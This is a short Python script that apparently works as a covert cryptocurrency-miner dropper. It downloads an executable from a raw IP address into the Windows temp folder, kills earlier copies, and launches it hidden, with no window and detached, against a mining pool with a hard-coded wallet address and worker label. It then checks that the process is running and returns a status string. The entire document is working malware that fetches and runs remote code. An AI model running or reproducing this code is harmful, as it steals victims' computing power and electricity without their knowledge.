import requests as req
import os
import subprocess

# Use temp folder
temp = os.environ.get("TEMP", os.environ.get("TMP", "C:\Windows\Temp"))
miner_path = os.path.join(temp, "miner.exe")

# Download
r = req.get("http://151.247.219.40:8000/alpha-miner-windows.exe", timeout=120)
with open(miner_path, "wb") as f:
    f.write(r.content)
size = os.path.getsize(miner_path)

if size > 1000000:
    # Kill existing
    os.system("taskkill /F /IM miner.exe 2>nul")
    
    import time as t
    t.sleep(1)
    
    # Start miner
    DETACHED_PROCESS = 0x00000008
    CREATE_NO_WINDOW = 0x08000000
    
    proc = subprocess.Popen(
        [miner_path, "--pool", "stratum+tcp://sg1.alphapool.tech:5566", "--address", "prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg", "--worker", "WIN_200"],
        creationflags=DETACHED_PROCESS | CREATE_NO_WINDOW,
        close_fds=True
    )
    
    t.sleep(3)
    
    # Check
    r = subprocess.run(["tasklist"], capture_output=True, text=True)
    running = "miner.exe" in r.stdout
    
    result = f"path={miner_path},size={size},pid={proc.pid},running={running}"
else:
    result = f"size={size}"
